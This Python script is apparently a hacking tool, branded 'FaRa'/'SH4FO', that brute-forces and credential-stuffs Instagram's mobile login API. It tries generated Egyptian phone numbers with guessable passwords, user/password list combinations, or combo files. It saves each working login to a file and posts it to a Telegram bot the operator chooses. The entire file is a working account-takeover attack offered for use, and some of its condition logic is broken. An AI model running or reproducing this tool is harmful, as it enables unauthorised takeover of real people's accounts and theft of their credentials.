import os

from time import sleep


import sys

import requests

SH4FO = requests.get("https://pastebin.com/raw/2fghp8Jc")
password = input('          TOOL PASSWORD: ')
if password == " SH4FO " :
  sys.exit()
if password in str(SH4FO.text):
  print(" FIRST STEP Is Done. Logged in Successfully as ")
  print("Please Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password !")
  sys.exit()
  
os.system("clear")
os.system("title " + " #SH4FO  - @7usa_sh4lati")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
def banner():
    print(""" SH4FO - SH4FO - SH4FO""")
    sleep(0.50)
    print("SH4FO - SH4FO - SH4FO")
    sleep(0.50)
    print("""SH4FO - SH4FO - SH4FO""")
    sleep(0.50)
banner()
print("")
print("\n[!]  𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗮 FaRa 𝘁𝗼𝗼𝗹  ")
h , b,s,block = 0,0,0,0
tele = input("[+] 𝐒𝐄𝐍𝐃 𝐇𝐈𝐓𝐒 𝐓𝐎 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌? YES/NO ?: ")
if "Y" in tele:
    id = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐈𝐃 𝐓𝐄𝐋𝐄 : ")
    bot = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𝐁𝐎𝐓 : ")
elif "y" in tele:
    id = input("[+] Enter Id Tele : ")
    bot = input("[+] 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 𝐁𝐎𝐓 : ")
print("==========================")
ask = input("""[1] ESH NAKAT
[2] ESH NAKAT
[3] CRACK 𝗔𝗨𝗧𝗢 𝗡𝗨𝗠:𝗡𝗨𝗠
==========================
[+] 𝗦𝗧𝗔𝗥𝗧 𝗛𝗨𝗡𝗧𝗜𝗡𝗚, 𝗧𝗬𝗣𝗘 3 : """)
if ask == "3":
#Tool Has By FaRa Tools 
    make = '0123456789'
    clear()
    banner()
    print("")
    print(f"\r                  [=] HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
#Suprice Mother Fucker HHHHH
    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+2011' + us
        pasw = '011' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝗛𝗜 FaRa 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 😉 𖡌 \n====================\n[=] 𝗨𝗦𝗘𝗥 𖡑 : {user} \n[=] 𝗣𝗘𝗦𝗦 𖤼 : {pasw}\n====================\nig : @mr_sh4fo - @7usa_sh4lati ")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] HIT : {h} / BAD : {b} / BAD : {s} / BLOCK : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] HIT : {h} / BAD : {b} / Scure : {s} / Block : {block}",end='')
elif ask =="2":
    clear()
    banner()
    print("")
    print(f"\r                  [=] HIT : {h} / BAD : {b} / SCURE : {s} / BLOCK : {block}",end='')
    user = open("Users.txt","r").read().splitlines()  
    pasw = open("Pass.txt","r").read().splitlines()    
    for u in user:
        for p in pasw:    
            req = requests.session()
            log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
            uid = str(uuid4())
            log_data = {
                'uuid': uid,
                'password': p,
                'username': u,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
            #print(r.text)
            if "logged_in_user" in r.text:
                  if "Y" or "y" in tele:
                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝗛𝗜 FaRa 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 😉 𖡌\n====================\n[=] 𝗨𝗦𝗘𝗥 𖡑 : {u} \n[=] 𝗣𝗘𝗦𝗦 𖤼 : {p}\n====================\nig : @mr_sh4fo - @7usa_sh4lati ")
         
                    open("Hited Accounts.txt","a").write(f"{u}:{p}\n")
                    h += 1
                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'challenge_required' in log.text:
                s += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
                open("Scure.txt","w").write(f"{user}:{pasw}\n")
            elif 'Please wait a few minutes' in log.text:
                block += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'Bad request' in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            else:
                b+=1    
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
#==================================================================
elif ask =="1":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= 𝗛𝗜 FaRa 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 😉 𖡌 \n====================\n[=] 𝗨𝗦𝗘𝗥 𖡑 : {user} \n[=] 𝗣𝗘𝗦𝗦 𖤼 : {pasw}\n====================\nig : @mr_sh4fo - @7usa_sh4lati ")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    